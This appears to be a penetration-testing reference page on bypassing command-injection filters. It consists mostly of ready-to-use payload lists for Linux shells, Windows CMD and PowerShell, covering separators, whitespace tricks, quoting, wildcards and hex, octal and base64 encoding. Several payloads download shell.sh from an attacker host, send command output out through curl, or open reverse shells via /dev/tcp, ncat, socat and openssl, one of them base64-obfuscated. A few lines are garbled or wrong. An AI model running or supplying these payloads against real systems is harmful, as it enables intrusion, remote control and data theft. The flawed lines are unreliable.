---
title: Filter Bypass Techniques
description: Command injection filters covering encoding, obfuscation, character substitution, wildcard abuse, environment variable tricks, and advanced evasion methods with extensive payloads and commands.
navigation:
  icon: i-lucide-terminal
  title: Filter Bypass
---

## Overview

Command injection filters attempt to block malicious OS commands by sanitizing user input. These filters range from simple blacklists to complex WAF rule sets. Understanding bypass techniques is critical for penetration testers to prove that input validation alone is insufficient without proper architectural controls.

::note
Filter bypass does not mean the application is "secure enough." Every bypass demonstrates a fundamental flaw in relying on input filtering rather than avoiding shell execution entirely. Document each bypass as evidence that the filtering approach is fundamentally flawed.
::

### Why Filters Fail

::card-group
  ::card
  ---
  title: Blacklist Incompleteness
  icon: i-lucide-list-x
  ---
  Blacklists can never cover every possible command, encoding, or obfuscation technique. New bypass vectors are constantly discovered.
  ::

  ::card
  ---
  title: Character Set Diversity
  icon: i-lucide-languages
  ---
  Unicode, hex, octal, base64, and variable expansion provide infinite ways to represent the same characters and commands.
  ::

  ::card
  ---
  title: Shell Feature Richness
  icon: i-lucide-terminal
  ---
  Bash, sh, PowerShell, and cmd.exe have extensive built-in features like globbing, brace expansion, parameter substitution, and arithmetic evaluation that bypass string-matching filters.
  ::

  ::card
  ---
  title: OS & Shell Variations
  icon: i-lucide-layers
  ---
  Different operating systems and shell interpreters parse input differently. A filter designed for bash may fail against dash, zsh, fish, or PowerShell.
  ::

  ::card
  ---
  title: Encoding Layers
  icon: i-lucide-binary
  ---
  Multiple encoding layers (URL encoding, double encoding, HTML entities, Unicode normalization) can pass through filters before the shell interprets the decoded command.
  ::

  ::card
  ---
  title: Context Confusion
  icon: i-lucide-shuffle
  ---
  Filters may apply to the wrong context — sanitizing at the HTTP layer but not at the shell execution layer, or vice versa.
  ::
::

### Filter Types Encountered

| Filter Type | Description | Bypass Difficulty |
| --- | --- | --- |
| Character Blacklist | Blocks specific chars like `;`, `|`, `&`, `` ` `` | Low |
| Command Blacklist | Blocks command names like `cat`, `ls`, `whoami` | Low-Medium |
| Regex Pattern Match | Matches patterns like `; *[a-z]+` | Medium |
| WAF Rule Sets | ModSecurity, Cloudflare, AWS WAF rules | Medium-High |
| Input Length Limit | Restricts input to N characters | Medium |
| Whitelist Validation | Only allows specific characters/patterns | High |
| Parameterized Execution | No shell invocation (not bypassable) | Not Bypassable |

---

## Command Separator Bypass

When filters block standard command separators, use alternative delimiters that the shell still interprets as command boundaries.

### Standard Separators

```bash [Standard Command Separators]
# Semicolon — execute sequentially
; whoami
;whoami
; whoami ;

# Pipe — pipe output
| whoami
|whoami

# AND operator — execute if previous succeeds
&& whoami
&&whoami

# OR operator — execute if previous fails
|| whoami
||whoami

# Background execution
& whoami
&whoami

# Backtick substitution
`whoami`

# Dollar parenthesis substitution
$(whoami)

# Newline
%0awhoami
%0a%0dwhoami

# Carriage return
%0dwhoami
```

### Alternative Separators When Standard Ones Are Blocked

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Linux/Bash"}

  ```bash [Linux Alternative Separators]
  # Newline character (URL encoded)
  input%0awhoami
  input%0a%0dwhoami

  # Carriage return
  input%0dwhoami

  # Vertical tab
  input%0bwhoami

  # Form feed
  input%0cwhoami

  # Tab character
  input%09whoami

  # Null byte (may terminate string in some languages before filter)
  input%00;whoami

  # Unicode newlines
  input%E2%80%A8whoami    # Line separator U+2028
  input%E2%80%A9whoami    # Paragraph separator U+2029

  # Bash-specific: process substitution
  <(whoami)
  >(whoami)

  # Bash-specific: command grouping
  {whoami}
  {whoami;}
  { whoami;}
  (whoami)

  # Here-string
  cat<<<$(whoami)

  # ANSI-C quoting with newline
  $'\n'whoami
  input$'\x0a'whoami
  ```

  :::

  :::tabs-item{icon="i-lucide-monitor" label="Windows/CMD"}

  ```cmd [Windows Alternative Separators]
  :: Standard separators
  & whoami
  && whoami
  | whoami
  || whoami

  :: Newline (URL encoded in web context)
  %0awhoami
  %0d%0awhoami

  :: Caret as line continuation
  wh^oami
  who^ami

  :: Parenthetical grouping
  (whoami)
  (whoami)&(hostname)

  :: Variable-based separator
  %CMDCMDLINE% & whoami

  :: FOR loop execution
  for /f %i in ('whoami') do echo %i
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal-square" label="PowerShell"}

  ```powershell [PowerShell Alternative Separators]
  # Semicolon
  ; whoami
  ;whoami

  # Pipe
  | whoami

  # Newline
  %0awhoami
  %0d%0awhoami

  # Expression operator
  $(whoami)

  # Invoke-Expression
  IEX "whoami"
  iex "whoami"

  # Call operator
  & whoami
  & "whoami"

  # Dot sourcing
  . { whoami }

  # Script block invocation
  &{whoami}
  .{whoami}
  ```

  :::
::

---

## Space Bypass Techniques

When filters block space characters, use alternative whitespace representations or shell features that don't require spaces.

### Linux Space Bypasses

::collapsible

```bash [Space Bypass — Linux]
# $IFS (Internal Field Separator — defaults to space/tab/newline)
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
ls${IFS}-la
cat${IFS}flag.txt

# $IFS with specific position
${IFS}cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd          # $9 is empty (9th positional param)

# Tab character (%09)
cat%09/etc/passwd
;cat%09/etc/passwd

# Brace expansion (no spaces needed)
{cat,/etc/passwd}
{ls,-la,/tmp}
{cat,flag.txt}
{head,-n,1,/etc/passwd}
{wget,http://attacker.com/shell.sh}

# Input redirection (no spaces around < )
cat</etc/passwd
cat<flag.txt

# ANSI-C quoting for space
cat$'\x20'/etc/passwd
cat$'\040'/etc/passwd
cat$'\t'/etc/passwd

# Variable assignment with space
X=$'\x20';cat${X}/etc/passwd
IFS=,;`cat<<<cat,/etc/passwd`

# Here-string without spaces
cat<<<test

# Null variables as space substitutes
cat${x}/etc/passwd            # $x is undefined = empty
cat$x/etc/passwd

# Using arithmetic expansion
cat$((0))/etc/passwd          # $((0)) = "0"? No, this appends 0
# Better approach:
A=/etc/passwd;cat$A

# Plus sign in some contexts
cat+/etc/passwd               # doesn't work in shell, but URL: cat+flag

# Combination approach
{cat,$IFS/etc/passwd}
c\at$IFS/etc/passwd
```

::

### Windows Space Bypasses

::collapsible

```cmd [Space Bypass — Windows]
:: Using commas (CMD treats commas as delimiters)
type,C:\Windows\System32\drivers\etc\hosts
ping,127.0.0.1
dir,C:\

:: Using semicolons
type;C:\Windows\System32\drivers\etc\hosts

:: Using equals sign
type=C:\Windows\System32\drivers\etc\hosts

:: Using tabs (%09)
type%09C:\Windows\System32\drivers\etc\hosts

:: Using caret
type^C:\flag.txt

:: Using parentheses
(type C:\flag.txt)

:: Using variable substitution
set x= && cmd /c type%x%C:\flag.txt

:: FOR loop (avoids direct spaces in command)
for /f "tokens=*" %a in ('type C:\flag.txt') do echo %a

:: PowerShell specific
type`tC:\flag.txt              # backtick-t = tab in PS
```

::

---

## Quote & Escape Bypass

Insert quotes, backslashes, or escape characters within command names to break filter pattern matching while the shell still executes correctly.

### Quote Insertion

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Single & Double Quotes"}

  ```bash [Quote Bypass — Linux]
  # Single quotes between characters
  w'h'o'am'i
  'w'h'o'a'm'i
  wh''oami
  who''ami
  ''w''h''o''a''m''i''

  # Double quotes between characters
  w"h"o"am"i
  "w"h"o"a"m"i
  wh""oami
  who""ami
  ""w""h""o""a""m""i""

  # Mixed quotes
  w"h"o'am'i
  'wh'"oam"'i'

  # Quotes around entire command
  "whoami"
  'whoami'

  # Empty quotes at start/end
  ''whoami
  whoami''
  ""whoami
  whoami""

  # Applied to file paths
  c'a't /e'tc'/pa'ss'wd
  c"a"t /e"tc"/pa"ss"wd
  cat '/etc/passwd'
  cat "/etc/passwd"

  # Applied to arguments
  ls '-la'
  ls "-la"
  ping '-c' '1' '127.0.0.1'
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Backslash Escape"}

  ```bash [Backslash Bypass — Linux]
  # Backslash before characters
  w\h\o\a\m\i
  \w\h\o\a\m\i
  wh\oami
  who\ami
  whoa\mi

  # Backslash in command names
  c\at /etc/passwd
  ca\t /etc/passwd
  ca\t /et\c/pa\ss\wd

  # Backslash with paths
  /\b\i\n/\c\a\t /\e\t\c/\p\a\s\s\w\d
  l\s -l\a /tmp

  # Combined with other techniques
  c\at$IFS/etc/passwd
  w\hoa\mi
  \c\a\t${IFS}\f\l\a\g\.\t\x\t

  # Backslash line continuation
  c\
  at /etc/\
  passwd
  # Shell interprets backslash-newline as line continuation

  # In wget/curl contexts
  w\get ht\tp://attacker.com/sh\ell.sh
  cu\rl http://attacker.com/payload
  ```

  :::

  :::tabs-item{icon="i-lucide-monitor" label="Windows Caret"}

  ```cmd [Caret Bypass — Windows CMD]
  :: Caret (^) is the escape character in CMD
  w^h^o^a^m^i
  ^w^h^o^a^m^i
  who^ami
  wh^oami

  :: Applied to full commands
  n^e^t u^s^e^r
  n^et^stat -a^n
  ty^pe C:\flag.txt
  p^i^n^g 127.0.0.1

  :: Caret before special characters
  echo test^|whoami
  echo test^&whoami
  echo test^;whoami

  :: Double caret in some contexts
  ^^w^^h^^o^^a^^m^^i

  :: Caret with spaces
  type^ C:\flag.txt
  type ^C:\flag.txt

  :: PowerShell backtick escape
  w`h`o`a`m`i
  `w`h`o`a`m`i
  wh`oami
  i`nv`o`ke-ex`pression "whoami"
  ```

  :::
::

---

## Command Name Bypass

When specific command names like `cat`, `whoami`, `ls`, `id`, `wget` are blacklisted, use alternative commands, aliases, built-in substitutes, or obfuscation.

### Alternative Commands for Common Operations

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="File Reading"}

  ```bash [Read Files Without 'cat']
  # Direct alternatives to cat
  tac /etc/passwd                    # Reverse cat
  nl /etc/passwd                     # Number lines
  head /etc/passwd                   # First 10 lines
  tail /etc/passwd                   # Last 10 lines
  more /etc/passwd                   # Pager
  less /etc/passwd                   # Better pager
  sort /etc/passwd                   # Sort and display
  uniq /etc/passwd                   # Show unique lines
  rev /etc/passwd | rev              # Reverse twice = original
  strings /etc/passwd                # Extract strings
  fold /etc/passwd                   # Wrap text
  fmt /etc/passwd                    # Format text
  column /etc/passwd                 # Columnize
  paste /etc/passwd                  # Merge lines
  expand /etc/passwd                 # Convert tabs to spaces
  unexpand /etc/passwd               # Convert spaces to tabs
  pr /etc/passwd                     # Paginate
  cut -c1- /etc/passwd               # Cut all characters
  od -A n -c /etc/passwd             # Octal dump as chars
  xxd /etc/passwd                    # Hex dump
  hexdump -C /etc/passwd             # Hex dump with ASCII
  base64 /etc/passwd                 # Base64 encode (still readable)
  base32 /etc/passwd                 # Base32 encode

  # Using sed
  sed '' /etc/passwd                 # No-op sed = cat
  sed -n 'p' /etc/passwd             # Print all lines
  sed 'q' /etc/passwd                # Print first line and quit

  # Using awk
  awk '{print}' /etc/passwd
  awk '1' /etc/passwd                # Truthy = print
  awk 'NR' /etc/passwd

  # Using grep
  grep '' /etc/passwd                # Match everything
  grep '.' /etc/passwd               # Match non-empty lines
  grep -v 'NOMATCH' /etc/passwd      # Exclude non-matching pattern

  # Using while read
  while read line; do echo "$line"; done < /etc/passwd

  # Using dd
  dd if=/etc/passwd bs=1M 2>/dev/null

  # Using cp to exfiltrate
  cp /etc/passwd /dev/stdout

  # Using diff against empty
  diff /dev/null /etc/passwd

  # Using xargs
  xargs < /etc/passwd

  # Using bash built-in
  exec < /etc/passwd; while read l; do echo "$l"; done
  mapfile -t lines < /etc/passwd; printf '%s\n' "${lines[@]}"

  # Using file descriptor redirection
  exec 3< /etc/passwd; while read -u3 line; do echo "$line"; done

  # Using python/perl/ruby one-liners
  python3 -c "print(open('/etc/passwd').read())"
  python -c "print(open('/etc/passwd').read())"
  perl -e 'open(F,"/etc/passwd");print<F>'
  ruby -e 'puts File.read("/etc/passwd")'
  php -r 'echo file_get_contents("/etc/passwd");'
  node -e 'console.log(require("fs").readFileSync("/etc/passwd","utf8"))'
  lua -e 'io.input("/etc/passwd"); print(io.read("*a"))'
  ```

  :::

  :::tabs-item{icon="i-lucide-user" label="User/System Info"}

  ```bash [Alternatives to whoami / id / uname]
  # whoami alternatives
  id                                 # Full user/group info
  id -un                             # Username only
  logname                            # Login name
  who am i                           # Current user info
  w                                  # Who is logged in
  echo $USER                         # Environment variable
  echo $LOGNAME                      # Login name variable
  echo $USERNAME                     # Some systems
  printenv USER                      # Print env var
  env | grep USER                    # Grep from env
  getent passwd $(id -u) | cut -d: -f1
  awk -F: -v uid=$(id -u) '$3==uid{print $1}' /etc/passwd
  python3 -c "import os; print(os.getlogin())"
  perl -e 'print scalar getpwuid($<)'

  # id alternatives
  groups                             # Group memberships
  getent passwd $USER                # User entry
  cat /etc/group | grep $USER        # Groups from file

  # uname alternatives
  hostnamectl                        # System info
  cat /etc/os-release                # OS information
  cat /proc/version                  # Kernel version
  cat /etc/issue                     # Distribution info
  lsb_release -a                     # LSB info
  echo $OSTYPE                       # OS type
  arch                               # Architecture
  ```

  :::

  :::tabs-item{icon="i-lucide-folder" label="Directory Listing"}

  ```bash [Alternatives to ls]
  # Direct alternatives
  dir                                # Some systems have dir
  vdir                               # Verbose dir
  find . -maxdepth 1                 # Find in current dir
  find / -maxdepth 1 -type d         # List root dirs
  echo *                             # Glob expansion
  echo /etc/*                        # Glob specific dir
  printf '%s\n' *                    # Print each file
  printf '%s\n' /etc/*               # List /etc contents

  # Using stat
  stat *                             # Detailed file info

  # Using tree
  tree -L 1                          # Tree view

  # Using du
  du -a . --max-depth=1              # Disk usage listing

  # Using file
  file *                             # File types

  # Using bash compgen
  compgen -f                         # Complete filenames
  compgen -d                         # Complete directories

  # Using python/perl
  python3 -c "import os; print('\n'.join(os.listdir('.')))"
  perl -e 'print join("\n", glob("*"))'
  ruby -e 'puts Dir.glob("*")'
  php -r 'print_r(scandir("."));'
  ```

  :::

  :::tabs-item{icon="i-lucide-network" label="Network Commands"}

  ```bash [Alternatives to wget / curl / nc]
  # wget alternatives
  curl http://attacker.com/shell.sh -o shell.sh
  fetch http://attacker.com/shell.sh          # BSD
  lwp-download http://attacker.com/shell.sh   # Perl
  lynx -source http://attacker.com/shell.sh
  links -source http://attacker.com/shell.sh

  # Using python
  python3 -c "import urllib.request; urllib.request.urlretrieve('http://attacker.com/shell.sh','shell.sh')"
  python -c "import urllib; urllib.urlretrieve('http://attacker.com/shell.sh','shell.sh')"

  # Using perl
  perl -e 'use LWP::Simple; getstore("http://attacker.com/shell.sh","shell.sh")'
  perl -MLWP::Simple -e 'mirror("http://attacker.com/shell.sh","shell.sh")'

  # Using ruby
  ruby -e 'require "open-uri"; File.write("shell.sh", URI.open("http://attacker.com/shell.sh").read)'

  # Using php
  php -r 'file_put_contents("shell.sh", file_get_contents("http://attacker.com/shell.sh"));'
  php -r 'readfile("http://attacker.com/shell.sh");'

  # Using /dev/tcp (bash built-in)
  exec 3<>/dev/tcp/attacker.com/80; echo -e "GET /shell.sh HTTP/1.1\r\nHost: attacker.com\r\n\r\n" >&3; cat <&3

  # Netcat alternatives for reverse shells
  bash -i >& /dev/tcp/attacker.com/4444 0>&1
  ncat attacker.com 4444 -e /bin/bash
  socat TCP:attacker.com:4444 EXEC:bash
  openssl s_client -connect attacker.com:4444
  ```

  :::
::

### Command Name Obfuscation

::tabs
  :::tabs-item{icon="i-lucide-eye-off" label="Variable Concatenation"}

  ```bash [Build Commands from Variables]
  # Split command into variables and concatenate
  a=wh;b=oam;c=i;$a$b$c
  a=ca;b=t;$a$b /etc/passwd
  a=who;b=ami;$a$b
  a=c;b=at;$a$b${IFS}/etc/passwd

  # Using arrays
  cmd=(w h o a m i);${cmd[*]}
  cmd=(c a t);${cmd[*]} /etc/passwd

  # Using printf
  $(printf 'wh\x6fami')
  $(printf '\167\150\157\141\155\151')
  $(printf '\x77\x68\x6f\x61\x6d\x69')

  # Using echo -e
  $(echo -e '\x77\x68\x6f\x61\x6d\x69')
  $(echo -e 'wh\x6fami')

  # Using xxd to reconstruct
  echo '77686f616d69' | xxd -r -p | bash
  echo '636174202f6574632f706173737764' | xxd -r -p | bash

  # Using rev to reverse
  $(echo 'imaohw' | rev)
  $(echo 'dwssap/cte/ tac' | rev)
  $(rev<<<'imaohw')
  $(rev<<<'dwssap/cte/ tac')

  # Using cut to build characters
  $(echo "abcdefghijklmnopqrstuvwxyz" | cut -c3,1,20)
  ```

  :::

  :::tabs-item{icon="i-lucide-eye-off" label="Wildcard & Glob"}

  ```bash [Wildcard Bypass]
  # Single character wildcard (?)
  /bin/w?oami
  /bin/who?mi
  /bin/whoa?i
  /bin/c?t /etc/passwd
  /bin/ca? /etc/passwd
  /???/??t /???/??????
  /???/???/???l ??

  # Multi character wildcard (*)
  /bin/wh*
  /bin/who*
  /bi*/wh*mi
  /b*n/wh*mi
  /bi*/ca* /etc/pas*
  /b*/c*t /e*/p*d

  # Character ranges
  /bin/ca[t] /etc/passwd
  /bin/wh[o]ami
  /bin/w[h]oami
  /bin/c[a]t /etc/p[a]sswd
  /bin/ca[s-u] /etc/passwd       # Range: s,t,u → matches cat

  # Negation ranges
  /bin/ca[!a-s] /etc/passwd      # Not a-s → matches t

  # Using ? for every character
  /???/??t /???/??????
  /???/?????? /???/??????

  # Extended globbing (bash with extglob)
  /bin/+(w)+(h)+(o)+(a)+(m)+(i)
  /bin/@(cat|tac) /etc/passwd
  ```

  :::

  :::tabs-item{icon="i-lucide-eye-off" label="Path Abuse"}

  ```bash [Full Path & PATH Manipulation]
  # Use full path to bypass command name filter
  /bin/cat /etc/passwd
  /usr/bin/cat /etc/passwd
  /bin/whoami
  /usr/bin/whoami
  /usr/bin/id
  /bin/ls -la

  # Find where a command lives
  /usr/bin/which cat
  /usr/bin/whereis cat

  # Use different shell to execute
  /bin/sh -c "whoami"
  /bin/bash -c "whoami"
  /bin/dash -c "whoami"
  /bin/zsh -c "whoami"
  /usr/bin/env bash -c "whoami"
  /usr/bin/env sh -c "whoami"

  # Manipulate PATH
  PATH=/bin:$PATH;whoami
  export PATH=/bin:/usr/bin;whoami

  # Use env to run
  env whoami
  env cat /etc/passwd
  env -- whoami

  # Use busybox
  busybox cat /etc/passwd
  busybox whoami
  busybox ls

  # Use nice/timeout/strace as wrappers
  nice cat /etc/passwd
  timeout 5 cat /etc/passwd
  strace -o /dev/null cat /etc/passwd
  ltrace cat /etc/passwd
  time cat /etc/passwd
  ```

  :::

  :::tabs-item{icon="i-lucide-monitor" label="Windows Obfuscation"}

  ```cmd [Windows Command Obfuscation]
  :: Environment variable substring
  :: %COMSPEC% = C:\WINDOWS\system32\cmd.exe
  %COMSPEC:~-3%                          :: "exe" — not directly useful
  :: But you can build commands from env vars:
  set a=who&set b=ami&call %a%%b%

  :: Variable manipulation
  set cmd=whoami && call %cmd%
  set "x=who" && set "y=ami" && call %x%%y%

  :: Using cmd /c
  cmd /c whoami
  cmd /c "whoami"
  cmd.exe /c whoami
  cmd /v /c "set a=wh&set b=oami&echo !a!!b!" | cmd

  :: Case insensitive (Windows commands are case-insensitive)
  WhOaMi
  WHOAMI
  Whoami
  wHoAmI

  :: Using FOR loop
  for /f "tokens=*" %a in ('whoami') do echo %a
  for %i in (whoami) do @%i

  :: Caret insertion
  w^h^o^a^m^i
  c^m^d /c w^h^o^a^m^i
  p^o^w^e^r^s^h^e^l^l -c "whoami"

  :: Percent variable insertion (CMD ignores undefined vars)
  w%random:~0,0%h%random:~0,0%o%random:~0,0%a%random:~0,0%m%random:~0,0%i
  who%NOTEXIST%ami
  wh%xyz%oami

  :: Double percent in batch files
  w%%h%%o%%a%%m%%i

  :: Using WMIC
  wmic process call create "cmd /c whoami > C:\output.txt"
  wmic os get caption

  :: Using PowerShell encoding
  powershell -enc dwBoAG8AYQBtAGkA
  :: (base64 of UTF-16LE "whoami")
  ```

  :::
::

---

## Encoding Bypass

### URL Encoding

```bash [URL Encoding Bypass]
# Single URL encoding
%3B whoami                        # ; whoami
%7C whoami                        # | whoami
%26 whoami                        # & whoami
%26%26 whoami                     # && whoami
%7C%7C whoami                     # || whoami
%60whoami%60                      # `whoami`
%24(whoami)                       # $(whoami)
%0awhoami                         # newline + whoami

# Double URL encoding (when app decodes twice)
%253B whoami                      # ; whoami (decoded twice)
%257C whoami                      # | whoami
%2526 whoami                      # & whoami
%250a whoami                      # newline + whoami

# Triple URL encoding (rare)
%25253B whoami

# Full command URL encoded
%77%68%6f%61%6d%69                # whoami
%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64  # cat /etc/passwd

# Mixed encoding
;%77hoami
%3Bwhoami
%3B%77%68oami
```

### Hex Encoding

```bash [Hex Encoding Bypass]
# Bash hex with $'\x..'
$'\x77\x68\x6f\x61\x6d\x69'                              # whoami
$'\x63\x61\x74' $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'  # cat /etc/passwd
$'\x69\x64'                                                # id
$'\x6c\x73'                                                # ls

# Using echo -e
echo -e '\x77\x68\x6f\x61\x6d\x69' | bash
echo -e '\x63\x61\x74 \x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | bash

# Using printf
$(printf '\x77\x68\x6f\x61\x6d\x69')
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# Using xxd
echo 77686f616d69 | xxd -r -p | bash
echo 636174202f6574632f706173737764 | xxd -r -p | bash

# Hex with arithmetic
$((16#77)) = 119 = 'w'
# Building command from hex values in arithmetic
```

### Octal Encoding

```bash [Octal Encoding Bypass]
# Bash octal with $'\0..'
$'\167\150\157\141\155\151'                                    # whoami
$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'  # cat /etc/passwd
$'\151\144'                                                     # id
$'\154\163'                                                     # ls

# Using echo with octal
echo -e '\167\150\157\141\155\151' | bash
$(echo -e '\167\150\157\141\155\151')

# Using printf with octal
$(printf '\167\150\157\141\155\151')
$(printf '\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144')

# Partial octal mixing
$'\167'hoami                    # \167 = 'w'
$'\143'at /etc/passwd           # \143 = 'c'
```

### Base64 Encoding

```bash [Base64 Encoding Bypass]
# Encode and decode execution
echo d2hvYW1p | base64 -d | bash                    # whoami
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash        # cat /etc/passwd
echo aWQ= | base64 -d | bash                        # id
echo bHMgLWxh | base64 -d | bash                    # ls -la
echo dW5hbWUgLWE= | base64 -d | bash                # uname -a
echo bmV0c3RhdCAtdHVscG4= | base64 -d | bash         # netstat -tulpn

# Using bash -c
bash -c "$(echo d2hvYW1p | base64 -d)"
sh -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Using eval
eval $(echo d2hvYW1p | base64 -d)

# Base64 without base64 command (using openssl)
echo d2hvYW1p | openssl base64 -d | bash

# Base64 without spaces
echo${IFS}d2hvYW1p${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash

# Reverse shell via base64
echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx | base64 -d | bash
# Decoded: bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python base64 execution
python3 -c "import base64,os;os.system(base64.b64decode('d2hvYW1p').decode())"

# Perl base64
perl -MMIME::Base64 -e 'system(decode_base64("d2hvYW1p"))'
```

### Unicode & UTF-8 Bypass

```bash [Unicode Bypass]
# Unicode full-width characters (some parsers normalize these)
# Full-width "whoami": ｗｈｏａｍｉ
# These map to ASCII equivalents after Unicode normalization

# Unicode homoglyphs (visually similar characters)
# Cyrillic 'а' (U+0430) vs Latin 'a' (U+0061)
# Cyrillic 'о' (U+043E) vs Latin 'o' (U+006F)
# Cyrillic 'с' (U+0441) vs Latin 'c' (U+0063)

# URL-encoded Unicode
%E2%80%8B;whoami       # Zero-width space before semicolon
%EF%BB%BF;whoami       # BOM character
%C0%AF                 # Overlong encoding of /
%C0%AE                 # Overlong encoding of .

# Unicode newlines
%E2%80%A8whoami        # Line separator U+2028
%E2%80%A9whoami        # Paragraph separator U+2029

# Unicode in Python context
python3 -c "import os; os.system('\u0077\u0068\u006f\u0061\u006d\u0069')"
```

---

## Environment Variable Tricks

Use existing environment variables or shell special variables to construct commands and arguments without typing blocked characters.

::tabs
  :::tabs-item{icon="i-lucide-variable" label="Variable Extraction"}

  ```bash [Extract Characters from Environment Variables]
  # $PATH usually contains /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  # Extract characters by position

  # Extract '/' from $PATH (usually first character)
  ${PATH:0:1}                       # /

  # Extract characters for building commands
  ${PATH:0:1}etc${PATH:0:1}passwd   # /etc/passwd

  # Extract from $HOME (/root or /home/user)
  ${HOME:0:1}                       # /

  # Extract from $SHELL (/bin/bash)
  ${SHELL:0:1}                      # /

  # Build "cat" from environment
  # If $PATH = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  # Position 14 = 'c', position 5 = 'a', position 19 = 't' (varies)

  # Build "/etc/passwd" from $PATH
  ${PATH:0:1}e${PATH:19:1}c${PATH:0:1}passwd

  # Extract from $PWD
  ${PWD:0:1}                        # / (if in root-level dir)

  # Extract from $HOSTNAME
  # Depends on hostname value

  # Using $RANDOM for character extraction
  # $RANDOM returns random numbers 0-32767
  # Not directly useful but can seed other extractions

  # $SHLVL (shell level, usually 1 or 2)
  ${SHLVL}                          # 1

  # Combine extractions
  ${PATH:0:1}bin${PATH:0:1}cat ${PATH:0:1}etc${PATH:0:1}passwd
  # Equals: /bin/cat /etc/passwd
  ```

  :::

  :::tabs-item{icon="i-lucide-variable" label="Special Variables"}

  ```bash [Bash Special Variables for Bypass]
  # $0 = shell name (bash, sh, etc.)
  echo $0                           # bash or /bin/bash

  # $$ = PID (useful for temp files)
  echo $$

  # $? = exit code of last command
  echo $?                           # 0 if success

  # $! = PID of last background process
  # $_ = last argument of previous command
  # $- = current shell options

  # $IFS = Internal Field Separator (space, tab, newline by default)
  cat${IFS}/etc/passwd

  # $RANDOM = random number
  echo $RANDOM

  # ${#variable} = length of variable
  ${#SHLVL}                         # Length of SHLVL value

  # ${!prefix*} = variable names starting with prefix
  echo ${!BASH*}                    # All BASH* variables

  # Undefined variables expand to empty string
  ${doesnt_exist}cat /etc/passwd    # = cat /etc/passwd
  c${nope}at /etc/passwd            # = cat /etc/passwd
  w${z}h${z}o${z}a${z}m${z}i       # = whoami

  # Using parameter expansion
  ${SHELL:5:1}                      # From $SHELL=/bin/bash, position 5 = 'b'
  ${PATH:6:1}                       # Character at position 6 in PATH

  # Build arbitrary strings
  # If SHELL=/bin/bash
  # ${SHELL:5:4} = "bash"
  # ${SHELL:0:4} = "/bin"
  ${SHELL:0:4}${SHELL:0:1}cat ${SHELL:0:1}etc${SHELL:0:1}passwd
  # = /bin/cat /etc/passwd
  ```

  :::

  :::tabs-item{icon="i-lucide-variable" label="Windows Variables"}

  ```cmd [Windows Environment Variable Tricks]
  :: %COMSPEC% = C:\WINDOWS\system32\cmd.exe
  :: Extract substrings with %variable:~start,length%

  :: Extract from COMSPEC
  %COMSPEC:~0,1%                    :: C
  %COMSPEC:~-7,3%                   :: cmd

  :: %PATHEXT% = .COM;.EXE;.BAT;.CMD;...
  :: %OS% = Windows_NT
  :: %SYSTEMROOT% = C:\WINDOWS

  :: Build commands from environment
  :: whoami from scratch using env vars and set
  set a=who
  set b=ami
  call %a%%b%

  :: Using delayed expansion
  cmd /v /c "set a=who&set b=ami&echo !a!!b!"

  :: Using FOR to execute
  for %a in (whoami) do @%a

  :: PowerShell variable tricks
  $env:COMSPEC                      # C:\WINDOWS\system32\cmd.exe
  &($env:COMSPEC[4]+$env:COMSPEC[15]+'d')  # Build "cmd" from COMSPEC chars
  ```

  :::
::

---

## Chained Encoding & Multi-Layer Obfuscation

### Layer Stacking

```bash [Multi-Layer Encoding]
# Layer 1: Base64 encode the command
# Layer 2: Hex encode the base64
# Layer 3: Build decoder from env vars

# Example: Execute "id"
# Step 1: base64("id") = "aWQ="
# Step 2: hex("aWQ=") = "61575139"
# Step 3: Execute
echo 61575139 | xxd -r -p | base64 -d | bash

# Example: Execute "cat /etc/passwd"
# Step 1: base64("cat /etc/passwd") = "Y2F0IC9ldGMvcGFzc3dk"
# Step 2: Reverse it = "dw3zc2FwL2N0ZS9JIDBhMk"
# Wait, let's do this properly:
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# Reverse + Base64
echo 'dwssap/cte/ tac' | rev | bash
# = cat /etc/passwd

# Base64 of reversed command
echo "$(echo ZHdzc2FwL2N0ZS8gdGFj | base64 -d | rev)" | bash
# ZHdzc2FwL2N0ZS8gdGFj = base64 of "dwssap/cte/ tac"
# rev gives "cat /etc/passwd"

# Triple obfuscation
# 1. Reverse the command
# 2. Base64 encode it
# 3. Hex encode that
echo 5a4864 | xxd -r -p  # partial demo

# Variable + Quote + Backslash combo
a='c'\''at'; b='/et'\''c/pa'\''sswd'; $a $b
# Breaks up strings with quotes to avoid pattern matching

# Dynamic construction with eval
X='ZWNobyAid2hvYW1pIiB8IGJhc2g='; eval $(echo $X | base64 -d)
# X = base64("echo \"whoami\" | bash")
```

### Brace Expansion

```bash [Bash Brace Expansion Bypass]
# Brace expansion generates strings before command execution

# Command execution
{cat,/etc/passwd}
{ls,-la,/tmp}
{head,-n,5,/etc/passwd}
{wget,http://attacker.com/shell.sh,-O,/tmp/shell.sh}
{bash,-c,whoami}
{python3,-c,'import os;os.system("id")'}
{curl,http://attacker.com/exfil?d=$(whoami)}

# Range expansion
echo {a..z}                      # a b c ... z
echo {0..9}                      # 0 1 2 ... 9
echo /etc/pass{wd,wd.bak}        # /etc/passwd /etc/passwd.bak

# Nested braces
{/bin/{cat,tac},/etc/passwd}

# With $IFS for spaces
{cat,$IFS/etc/passwd}
```

---

## Blacklist-Specific Bypasses

### When Specific Keywords Are Blocked

